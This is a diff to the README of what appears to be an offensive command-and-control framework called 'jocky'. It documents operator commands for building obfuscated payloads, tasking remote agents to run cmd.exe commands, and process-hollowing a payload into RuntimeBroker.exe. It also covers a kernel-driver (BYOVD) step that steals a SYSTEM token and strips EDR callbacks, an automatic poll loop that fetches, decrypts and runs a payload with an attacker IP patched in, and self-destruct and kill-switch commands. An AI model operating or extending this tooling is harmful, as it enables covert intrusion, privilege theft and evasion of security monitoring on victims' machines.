@@ -113,34 +113,41 @@ Sessions are persisted across restarts.
 #### Build server commands
 
 ```
-build   --src <file.cpp> --out <name.exe> [--passes fla,sub] [--no-poly] [--no-spoof]
+build   --template <file.cpp> --output <name.exe> [--passes fla,sub]
         Compile a source file through the OLLVM pipeline
-        
+
 sessions
-        List saved build server sessions
+        List past build jobs (id, file, output, status, exit code)
 
 history
-        Show recent build jobs
+        Alias for sessions
 ```
 
 #### C2 / agent commands
 
 ```
-targets
+targets [--limit N]
         List registered agents (id, hostname, IP, status, last seen)
 
-task    --agent <id> --type <type> [--cmd <cmd>]
-        Queue a task for an agent
-        Types: shell, hollow, payload, burn
+task    --agent <id|all> --cmd <type> [--data <json>]
+        Queue a task for one agent or all online agents
+        Types:
+          shell         run a cmd.exe command  --data {"cmd":"whoami"}
+          hollow        inject payload.exe into RuntimeBroker.exe (no extra data needed)
+          byovd         run kernel driver pipeline (token steal + remove EDR callbacks)
+          self_destruct delete payload from disk and schedule own binary for deletion
 
-tasks   --agent <id>
-        List pending/completed tasks for an agent
+        NOTE: payload delivery is automatic — the agent fetches the bundle on its own
+        poll cycle whenever the C2 has a new one. There is no "payload" task type.
+
+tasks   --agent <id> [--limit N]
+        List task history (id, type, status, created time) for an agent
 
 telemetry --agent <id> [--limit N]
-          Show telemetry/output returned by agent
+          Show results posted back by the agent for completed tasks
 
 shell   --agent <id>
-        Interactive cmd.exe relay (REPL, latency ≈ poll interval ~30s)
+        Interactive cmd.exe relay (REPL; latency ≈ poll interval, default 30 s)
         Type 'exit' or Ctrl-C to return to jocky
 ```
 
@@ -148,17 +155,20 @@ shell   --agent <id>
 
 ```
 bundle  upload --file <bundle.bin>
-        Upload AES-encrypted JCKY bundle to C2
+        Upload a pre-built AES-encrypted JCKY bundle to C2
 
 payload upload --file <payload.exe>
-        Upload payload.exe to C2 (served as chunked DNS TXT or HTTP)
+        Upload payload.exe to C2
 
 deploy  --template <file.cpp> --passes <p,q> --driver <driver.sys>
-        [--agent-bin <jocky_agent.exe>] --aes-key <64hex>
-        Full pipeline: build → bundle → upload to C2
+        [--agent-bin <jocky_agent.exe>] [--aes-key <64hex>]
+        Full pipeline: build via jocky server → download artifact →
+        bundle with driver → upload bundle to C2.
+        AES key falls back to JOCKY_AES_KEY env var if --aes-key is omitted.
 
-burn    --agent <id>
-        Send burn task: agent deletes itself and stops checking in
+burn    [--confirm]
+        Operator kill switch: wipes all C2 payload data and sends self_destruct
+        to every online agent. Requires --confirm to execute.
 ```
 
 ---
@@ -212,10 +222,14 @@ Task types handled:
 
 | Type | Action |
 |------|--------|
-| `shell` | `cmd.exe /C <cmd>`, posts stdout to telemetry |
-| `hollow` | Process-hollows `payload.exe` into `RuntimeBroker.exe` (or `dllhost.exe`) |
-| `payload` | Downloads and launches `payload.exe` from C2 |
-| `burn` | Deletes self, stops polling |
+| `shell` | `cmd.exe /C <cmd>`, posts stdout/stderr to telemetry |
+| `hollow` | Hollows `payload.exe` (from `C:\Windows\Temp\`) into `RuntimeBroker.exe` |
+| `byovd` | Calls `RunClientPipeline()` — steals SYSTEM token, strips EDR callbacks via kernel driver |
+| `self_destruct` | Deletes payload from disk, schedules own binary deletion via deferred `cmd.exe`, exits |
+
+Payload delivery is **not** a task — it runs automatically in the agent's poll loop (`PayloadPoll()`).
+When the C2 has a new bundle, the agent fetches, base64-decodes, AES-decrypts, patches attacker IP,
+writes `payload.exe` to `C:\Windows\Temp\`, and calls `RunHollowPipeline()` automatically.
 
 Syscall resolution: Hell's Gate → Halo's Gate → fresh ntdll copy fallback.
 
@@ -320,11 +334,16 @@ jocky > shell --agent <agent_id>
 [abc123]> whoami
 [abc123]> exit
 
-jocky > task --agent <id> --type hollow
-jocky > telemetry --agent <id>
+jocky > task --agent <id> --cmd byovd
+jocky > telemetry --agent <id> --limit 3
+# → {"exit_code": 0}  (SYSTEM token stolen, EDR callbacks stripped)
 
-# 7. Cleanup
-jocky > burn --agent <id>
+jocky > task --agent <id> --cmd hollow
+jocky > telemetry --agent <id> --limit 3
+# → {"hollowed_pid": 4812}
+
+# 7. Cleanup (kills ALL online agents + wipes C2 payload data)
+jocky > burn --confirm
 ```
 
 ---
